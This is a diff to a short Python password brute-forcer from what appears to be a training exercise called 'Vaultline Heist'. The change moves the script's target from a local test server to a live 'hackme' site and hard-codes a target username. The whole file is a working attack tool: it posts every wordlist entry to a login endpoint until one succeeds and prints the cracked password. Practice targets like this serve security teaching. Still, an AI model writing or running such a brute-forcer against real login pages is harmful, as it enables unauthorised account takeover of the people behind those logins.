@@ -1,31 +1,26 @@
 """
 Vaultline Heist — password brute-forcer (Stage 1).
 
-Tries each password from a wordlist against the client portal login until one
-works. This is the kind of script a student (with a hand from an AI) writes to
-crack the login.
-
-Usage:
-    python tools/brute_force.py <username> [base_url] [wordlist]
+Tries each password from the wordlist against the login until one works.
+Edit USERNAME (and URL for the live site), then run:  python brute_force.py
 """
 
-import sys
 import requests
 
-username = sys.argv[1] if len(sys.argv) > 1 else "i.fenwick"
-base = sys.argv[2] if len(sys.argv) > 2 else "http://127.0.0.1:8000"
-wordlist = sys.argv[3] if len(sys.argv) > 3 else "tools/wordlist.txt"
-url = base.rstrip("/") + "/portal/login/"
+USERNAME = "v.fenwick"                              # your target's username
+URL      = "https://hackme.smecworkspace.com/portal/login/"    # the login endpoint
+WORDLIST = "tools/wordlist.txt"                      # the password list
 
-print(f"[*] Brute-forcing {username} at {url}\n")
+print(f"[*] Brute-forcing {USERNAME} ...", flush=True)
 
-for line in open(wordlist, encoding="latin-1", errors="ignore"):
+tries = 0
+for line in open(WORDLIST, encoding="latin-1", errors="ignore"):
     password = line.strip()
-    if not password:
-        continue
-    r = requests.post(url, json={"username": username, "password": password})
-    if r.status_code == 200 and r.json().get("success"):
-        print(f"[+] FOUND -> {username} : {password}")
+    tries += 1
+    r = requests.post(URL, json={"username": USERNAME, "password": password})
+    if r.json().get("success"):
+        print(f"[+] FOUND after {tries} tries -> {password}")
         break
+    print(f"[{tries}] tried: {password}", flush=True)   # live progress
 else:
-    print("[-] Not found. Wrong wordlist?")
+    print("[-] Not found. Wrong wordlist or username?")
